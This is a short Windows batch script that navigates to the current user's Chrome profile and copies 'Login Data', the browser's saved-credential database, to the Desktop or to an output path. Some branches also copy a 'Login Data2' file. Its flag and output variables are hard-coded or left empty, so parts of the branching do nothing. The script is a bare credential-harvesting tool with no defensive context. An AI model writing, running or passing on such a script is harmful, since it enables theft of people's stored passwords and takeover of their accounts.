set drive=C
set set=n
if '%set%'=='y' goto :sec
set out=n
if '%out%'=='y' goto :top1
cd %drive%:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\
xcopy "Login Data" C:\Users\%username%\Desktop
exit
:top1
set output=
cd %drive%:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\
xcopy "Login Data" %output%
echo Copied to Desktop!...
exit
:sec
set out=n
if '%out%'=='y' goto :sec1
cd %drive%:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\
xcopy "Login Data" C:\Users\%username%\Desktop
xcopy "Login Data2" C:\Users\%username%\Desktop
echo Copied to Desktop!
exit
:sec1
set output=
cd %drive%:\Users\%username%\AppData\Local\Google\Chrome\User Data\Default\
xcopy "Login Data" %output%
xcopy "Login Data2" %output%
